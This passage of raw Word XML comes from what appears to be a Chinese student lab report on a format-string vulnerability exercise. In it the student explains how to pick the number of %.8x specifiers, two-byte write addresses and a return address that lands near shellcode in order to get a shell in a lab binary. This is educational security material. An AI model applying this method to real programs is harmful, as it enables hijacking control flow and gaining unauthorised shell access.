                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>()</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="28F4134B" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:spacing w:after="240"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="3694F71E" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD90FB2" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:del w:id="227" w:author="zhao ruizhi" w:date="2023-05-08T16:54:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="228" w:author="zhao ruizhi" w:date="2023-05-08T16:54:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:delText>参考输出：</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="213BD251" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="229" w:author="zhao ruizhi" w:date="2023-05-08T16:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2B545501" wp14:editId="5D4DC0C2">
              <wp:extent cx="5274310" cy="28797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74310" cy="2879725"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0F003F2D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hint="eastAsia"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>实践题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17845B58" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:del w:id="230" w:author="zhao ruizhi" w:date="2023-05-08T16:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>对f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>mtexploit.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>进行修改与完善，使其产生的</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>adfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>能够成功触发</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>mtvul</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>中的格式化字符串漏洞，并获取系统的控制权限。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB10913" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="231" w:author="zhao ruizhi" w:date="2023-05-08T16:55:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61B5EA07" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="232" w:author="赵睿智" w:date="2023-05-12T12:31:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="233" w:author="zhao ruizhi" w:date="2023-05-08T16:55:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="234" w:author="zhao ruizhi" w:date="2023-05-08T16:55:00Z">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>源代码</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="235" w:author="zhao ruizhi" w:date="2023-05-08T16:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>已在上面展示</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1ADFFD5D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="842" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="236" w:author="zhao ruizhi" w:date="2023-05-12T04:58:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="237" w:author="赵睿智" w:date="2023-05-12T12:32:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="0AE8B190" wp14:editId="1BF0A80C">
              <wp:extent cx="5266690" cy="3401695"/>
              <wp:effectExtent l="0" t="0" r="10160" b="8255"/>
              <wp:docPr id="3" name="图片 3" descr="截图 2023-05-12 12-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 2023-05-12 12-32-06"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId32"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5266690" cy="3401695"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2CFB4E27" w14:textId="19BF3D60" w:rsidR="00BB7608" w:rsidRPr="00D10C57" w:rsidRDefault="00BB7608" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="255"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="842" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="238" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
          <w:rPrChange w:id="239" w:author="zhao ruizhi" w:date="2023-05-12T04:58:00Z">
            <w:rPr>
              <w:ins w:id="240" w:author="zhao ruizhi" w:date="2023-05-12T04:55:00Z"/>
              <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
              <w:sz w:val="24"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="241" w:author="zhao ruizhi" w:date="2023-05-12T04:58:00Z">
        <w:r w:rsidRPr="00D10C57">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:b/>
            <w:bCs/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="242" w:author="zhao ruizhi" w:date="2023-05-12T04:58:00Z">
              <w:rPr>
                <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
                <w:sz w:val="24"/>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>分析：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="66C04260" w14:textId="6A07EA12" w:rsidR="00B366C6" w:rsidRDefault="003579F1" w:rsidP="00B366C6">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="243" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="244" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z">
        <w:r w:rsidRPr="003579F1">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>%.8x的填写个数：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="62EAAD61" w14:textId="4C0171A6" w:rsidR="003579F1" w:rsidRDefault="001D3D81" w:rsidP="003579F1">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="245" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z"/>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="246" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:ilvl w:val="1"/>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1722" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="247" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z">
        <w:r w:rsidRPr="001D3D81">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>为了找到</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D3D81">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>va_list</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D3D81">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>此时的偏移，得出攻击代码里需要填几个%.8x，我们通过试错</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="001D3D81">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>法最终</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="001D3D81">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>确定填写的数量为15个。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="14C328B7" w14:textId="662A773E" w:rsidR="003579F1" w:rsidRDefault="00BA0829" w:rsidP="00B366C6">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="248" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="249" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z">
        <w:r w:rsidRPr="00BA0829">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>addr1,2的确定：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="52A3C450" w14:textId="77777777" w:rsidR="00466CD9" w:rsidRDefault="00DF341A" w:rsidP="00466CD9">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="250" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="251" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z">
        <w:r w:rsidRPr="00DF341A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>由于我们是按照填写两字节修改方式在返回地址位置填写恶意脚本的存放位置，而恶意代码存放位置大致为0xffffcfd4+x，高位0xffff比低位数值大，所以我们需要先填低字节的位置，</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00DF341A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>由小端存储</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00DF341A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>方式</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00DF341A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>可知低</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00DF341A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t xml:space="preserve">字节位置就是ret </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DF341A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>addr</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DF341A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>的起始位置，也就是stack frame指针指向的位置上面4个字节处，故：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="32FFD49F" w14:textId="6CBABAF9" w:rsidR="00466CD9" w:rsidRPr="00466CD9" w:rsidRDefault="00466CD9" w:rsidP="00756A97">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="252" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
          <w:rPrChange w:id="253" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
            <w:rPr>
              <w:ins w:id="254" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="255" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1722"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="256" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
        <w:r w:rsidRPr="00466CD9">
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="257" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
              <w:rPr>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>addr1 = 0xffffcfb8+4</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E074E19" w14:textId="1B8CB606" w:rsidR="00DF341A" w:rsidRDefault="00466CD9" w:rsidP="00756A97">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="258" w:author="zhao ruizhi" w:date="2023-05-12T04:56:00Z"/>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="259" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:ilvl w:val="1"/>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1722" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="260" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
        <w:r w:rsidRPr="00466CD9">
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>addr2 = addr1+2</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28D68947" w14:textId="45ABB00D" w:rsidR="00BA0829" w:rsidRDefault="00827672" w:rsidP="00B366C6">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="261" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="262" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
        <w:r w:rsidRPr="00827672">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>返回地址值的确定：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="76FC095D" w14:textId="77777777" w:rsidR="00681DF2" w:rsidRDefault="008A1B32" w:rsidP="00827672">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="263" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="264" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
        <w:r w:rsidRPr="008A1B32">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>在实际操作过程中，虽然</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="008A1B32">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>badfile</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="008A1B32">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>中被pad填充，但如果pad过长还是会导致攻击失败，无法调用shell，所以我们选择的最终返回地址要离shellcode近一些。这里选择数组首位置后100字节处，所以返回地址确定为：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1E5F09CD" w14:textId="7CE4F79C" w:rsidR="00827672" w:rsidRDefault="008A1B32" w:rsidP="00681DF2">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="265" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z"/>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="266" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:ilvl w:val="1"/>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1722" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="267" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
        <w:r w:rsidRPr="008A1B32">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>0xffffcfd4+100</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0C9FB281" w14:textId="4185297B" w:rsidR="00827672" w:rsidRDefault="00B2370A" w:rsidP="00B366C6">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="268" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="269" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
        <w:r w:rsidRPr="00B2370A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>攻击脚本的最终确定：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7B6FD42F" w14:textId="59F57A48" w:rsidR="00B2370A" w:rsidRDefault="00B2370A" w:rsidP="00B2370A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1722" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="270" w:author="赵睿智" w:date="2023-05-12T12:31:00Z"/>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="271" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="272" w:author="zhao ruizhi" w:date="2023-05-12T04:57:00Z">
        <w:r w:rsidRPr="00B2370A">
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>按照字符串漏洞的相关思想构造即可：</w:t>
        </w:r>
      </w:ins>
    </w:p>
